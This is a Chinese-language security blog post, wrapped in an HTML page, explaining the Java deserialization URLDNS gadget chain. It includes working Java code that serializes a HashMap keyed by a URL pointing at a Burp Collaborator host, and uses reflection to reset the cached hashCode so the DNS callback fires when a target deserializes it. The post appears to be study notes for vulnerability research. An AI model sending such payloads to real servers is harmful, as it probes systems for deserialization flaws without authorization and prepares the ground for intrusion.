@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>URLDNS | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">URLDNS</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-03-18</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://pyroxenites.github.io/tag/T5QnKuhLq/">
+                    漏洞研究
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h2 id="简介">简介</h2>
+<p>URLDNS是Java反序列化中比较简单的一个链,由于URLDNS不依赖第三方包,同时不限制JDK版本,所以常用于检测反序列化的点</p>
+<p><strong>URLDNS不能执行命令,只能发送DNS请求</strong></p>
+<h4 id="序列化和反序列化">序列化和反序列化</h4>
+<p>序列化是为了将对象进行长期存储而诞生的方法,反序列化就是将存储的序列化内容恢复成对象</p>
+<blockquote>
+<p>把java对象变成一个字节</p>
+</blockquote>
+<p>Java的序列化和反序列化主要是writeObject和readObject函数,Java允许开发者对readObject进行功能的补充,故反序列化的时候会优先使用这个重写方法,所以开发者编写不当会造成任意命令执行。</p>
+<h3 id="要求">要求</h3>
+<ol>
+<li>继承Serializable接口,但这个接口什么都没有[空接口],是一个标志</li>
+<li>静态成员变量和transient标识的对象不能被反序列化</li>
+</ol>
+<blockquote>
+<p>要序列化一个对象,首先创建OutputStream对象</p>
+<p>再将其封装在一个ObjectOutputstream对象内</p>
+<p>接着只需要调用writeObject()即可将对象序列化,并将其发送给OutputStram</p>
+</blockquote>
+<ul>
+<li>只要服务端反序列化数据,客户端传递类的readobject中的代码会自动执行,给予攻击者在服务端允许代码的能力</li>
+</ul>
+<h3 id="可能实现的方法">可能实现的方法</h3>
+<ol>
+<li>入口类的readobject直接调用危险方法</li>
+<li>入口类参数中包含可控参数,该类有危险方法,readobject时调用</li>
+<li>入口类参数中包含可控类,该类又调用其他有危险类的方法,readobject时调用</li>
+</ol>
+<p>继承Serializable接口,入口类source(重写readobject 参数类型宽泛[Map&lt;Object,Object&gt;] 最好jdk自带)</p>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1647165205004-1f9956a9-481e-459c-9df8-c00fe447e185.png" alt="image-20211213141652279.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1647165214727-00fd87b6-a386-46cc-a4d9-5f256eb71ef6.png" alt="image-20211213141803759.png" loading="lazy"></figure>
+<p><img src="https://pyroxenites.github.io/post-images/1647165223494-9d82c932-d2c3-4e91-8557-540c99b742e8.png" alt="image-20211213142021430.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1647165231803-b4bd570c-7b54-48aa-909e-f86fdce3fd76.png" alt="image-20211213142041847.png" loading="lazy"></p>
+<p><strong>hash函数会调用传入对象的hashCode函数</strong>,下面我们传入的就是URL</p>
+<h3 id="urldns">URLDNS</h3>
+<p>利用链,也叫做<strong>gadget chains</strong></p>
+<pre><code>*     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+</code></pre>
+<p><img src="https://pyroxenites.github.io/post-images/1647165245256-a572863a-094e-4b1f-b640-072186608b82.png" alt="image-20211213142728092.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1647165257158-c142d491-62ac-46dd-84b1-f8dc35adb27a.png" alt="image-20211213142859703.png" loading="lazy"></p>
+<pre><code>查找接口的实现类： IDEA风格 ctrl + alt +B 在按F2查看详细文档注解 查看类或接口的继承关系： ctrl + h
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1647165268498-812a99dc-234d-4b6d-92dd-28bbc0817983.png" alt="image-20211213143015328.png" loading="lazy"></figure>
+<h3 id="容易实现的">容易实现的</h3>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1647165276936-78b110c7-4a69-43f2-8791-7853aaf2e385.png" alt="image-20211213143235054.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1647165283797-6ff62a4b-517a-4496-80f0-9e1dc94b0609.png" alt="image-20211213143321728.png" loading="lazy"></figure>
+<blockquote>
+<p>如果调用了URL类的hashcode函数,会做一个DNS请求</p>
+</blockquote>
+<pre><code class="language-java">import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.net.URL;
+import java.util.HashMap;
+
+public class Main {
+    public static void serialize(Object obj)throws Exception{
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+    }
+    public static void main(String[] args) throws Exception {
+        HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();
+        objectObjectHashMap.put(new URL(&quot;http://gwguroswqw80huhvyiifuoppkgq6ev.burpcollaborator.net&quot;),1);
+        serialize(objectObjectHashMap);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1647165306575-9e067fb4-65b5-4d20-8fa3-0d31a5916b46.png" alt="image-20211213144053448.png" loading="lazy"></figure>
+<blockquote>
+<p>序列化操作是便接收到请求了</p>
+</blockquote>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1647165315477-fac65d62-1e28-41d7-8a59-9080a42a1e5c.png" alt="image-20211213144152734.png" loading="lazy"></figure>
+<blockquote>
+<p>在put时候就调用了hash方法了,保证键的唯一的操作</p>
+</blockquote>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1647165326969-e29a3076-62d4-4db2-b161-3b866be20efa.png" alt="image-20211213144341308.png" loading="lazy"></figure>
+<p>hashcode在初始化的时候是-1,赋值以后值改变了</p>
+<p><strong>故反序列化时</strong> <strong>不会收到请求</strong><br>
+<img src="https://pyroxenites.github.io/post-images/1647165350159-27a79cbe-c510-427f-81b1-b123bdca63fd.png" alt="image-20211213144717392.png" loading="lazy"></p>
+<pre><code class="language-java">import java.io.FileInputStream;
+import java.io.ObjectInputStream;
+
+public class test {
+    public static Object unserialize(String filename) throws Exception{
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
+        Object o = objectInputStream.readObject();
+        return o;
+    }
+
+    public static void main(String[] args) throws Exception {
+        unserialize(&quot;ser.bin&quot;);
+    }
+}
+</code></pre>
+<h3 id="解决问题">解决问题</h3>
+<pre><code class="language-java">//import jdk.internal.ref.PhantomCleanable;
+
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
+
+public class Main {
+    public static void serialize(Object obj)throws Exception{
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+    }
+    public static void main(String[] args) throws Exception {
+        HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();
+        //在这里不要发送请求
+        //把url hashcode改成不是-1
+        URL url = new URL(&quot;http://gwguroswqw80huhvyiifuoppkgq6ev.burpcollaborator.net&quot;);
+        Class aClass = url.getClass();
+        Field hashcodes = aClass.getDeclaredField(&quot;hashCode&quot;);
+        hashcodes.setAccessible(true);
+        hashcodes.set(url,1234);
+        objectObjectHashMap.put(url,1);
+        hashcodes.set(url,-1);
+        //把hashcode变为-1
+        serialize(objectObjectHashMap);
+    }
+}
+</code></pre>
+<p>入口A HashMap ,接受参数O</p>
+<p>目标类B</p>
+<p>目标调用B.f</p>
+<p>A.readObject -&gt; O(B)[传入B].f<br>
+<img src="https://pyroxenites.github.io/post-images/1647165365149-60e7663d-14d9-49a0-ae72-4255d6322932.png" alt="image-20211213145929188.png" loading="lazy"></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/go-mu-ma-ti-ji-wen-ti/">
+              <h3 class="post-title">
+                下一篇：Go木马体积问题
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
